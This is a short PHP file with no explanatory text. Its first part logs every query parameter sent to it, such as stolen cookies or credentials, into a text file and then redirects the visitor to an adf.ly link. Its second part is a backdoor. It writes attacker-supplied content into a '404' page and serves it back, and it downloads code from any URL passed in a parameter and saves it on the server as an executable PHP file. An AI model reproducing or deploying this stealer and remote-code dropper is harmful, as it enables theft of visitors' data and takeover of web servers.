<?php
header("Location: http://adf.ly/bMx2w");
$handle = fopen("skcreations.txt", "a");
foreach($_GET as $variable => $value)
 {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404")){
 echo file_get_contents("404");
}

if (isset($_GET['skcreations'])){
 $f = fopen("skcreations.php", "w+");
 fwrite($f, file_get_contents($_GET["skcreations"]));
 fclose($f);
}
?>